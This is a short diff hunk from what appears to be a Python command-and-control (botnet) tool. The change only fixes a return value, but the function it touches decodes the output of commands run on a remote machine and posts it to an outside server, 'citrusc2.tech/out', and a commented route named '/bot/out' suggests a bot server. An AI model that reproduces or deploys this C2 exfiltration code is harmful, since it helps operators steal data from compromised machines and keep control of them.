@@ -31,7 +31,7 @@ def cmdoutput(input_encoding):
     message = message_bytes.decode('ascii')
     print("CMDOUTPUT: " + message)
     r = requests.post('http://citrusc2.tech/out', data={'output': message})
-    return output
+    return message
 
 
 # @app.route('/bot/out', methods=['POST'])
